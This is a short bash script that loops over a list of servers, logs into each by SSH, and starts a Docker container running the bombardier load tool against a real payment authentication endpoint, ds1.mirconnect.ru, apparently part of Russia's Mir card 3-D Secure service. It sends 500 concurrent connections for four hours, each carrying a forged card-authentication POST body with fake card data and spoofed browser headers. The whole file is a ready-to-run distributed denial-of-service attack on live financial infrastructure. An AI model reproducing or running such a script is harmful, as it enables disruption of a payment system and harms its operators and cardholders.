#!/usr/bin/env bash

while IFS= read -r line; do
    echo "Server: $line";
    server_ip=`echo $line | awk -F ";" '{print $1}'`
ssh -T andrew@$server_ip <<_EOF_
docker run --platform linux/amd64 -d alpine/bombardier -m POST -c 500 -p r -d 4h -b "version=3.0&pan=YWFhYWFhYWE=&expiry=YWFhYWFhYQ==&deviceCategory=0&purchAmount=100&purchaseDate=20220308+14:11:11&exponent=2&description=aaaaa&currency=643&merchantID=wildberries&merchantCountry=643&xid=MTIzNDEyMzQzMjE0&recurFreq=&recurEnd=&installments=&okUrl=https://ds1.mirconnect.ru/vbv/pareq&failUrl=https://ds1.mirconnect.ru/vbv/pareq&merchantName=wildberries&acqBIN=546901&merchantUrl=http://wildberries.ru/&dsMerchantId=20000000&utid=14999999&digest=YWFhYWFhYWFhYWFh&lastEventGmtTime=2022-03-08+14:11:11.123"  --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0"  --header="Accept: image/avif,image/webp,*/*"  --header="Accept-Language: ru-RU,ru;q=0.5"  --header="Accept-Encoding: gzip, deflate"  --header="Referer: https://www.google.com/"  --header="Sec-Fetch-Dest: image"  --header="Sec-Fetch-Mode: no-cors"  --header="Sec-Fetch-Site: same-site"  --header="Te: trailers"  --header="Content-Type: application/x-www-form-urlencoded"  --header="Content-Length: 516"  -l  https://ds1.mirconnect.ru/sc1/authreq
_EOF_
    echo "Server: $line. Done"
    echo ""
done < "${1}"


